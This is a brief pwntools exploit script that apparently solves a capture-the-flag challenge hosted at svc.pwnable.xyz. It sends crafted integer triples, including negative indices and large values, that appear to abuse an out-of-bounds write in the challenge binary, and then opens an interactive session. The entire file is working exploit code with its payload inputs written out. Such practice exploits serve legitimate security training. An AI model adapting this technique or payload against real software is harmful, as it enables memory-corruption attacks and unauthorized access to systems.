#!/usr/bin/python3
from pwn import *
elf = context.binary = ELF('challenge')
# context.log_level = "debug"
def start():
    if args.GDB:
        context.terminal = ['tmux', 'splitw', "-h"]
        return gdb.debug(elf.path)
    else:
        return remote('svc.pwnable.xyz',30003) 
# ===========================
io = start()
io.sendline("-5404319552844595200 0 -6")
io.recvuntil("Result: ")
io.sendline("184549376 0 -5")
io.recvuntil("Result: ")
io.sendline("1 1 1000")
io.interactive()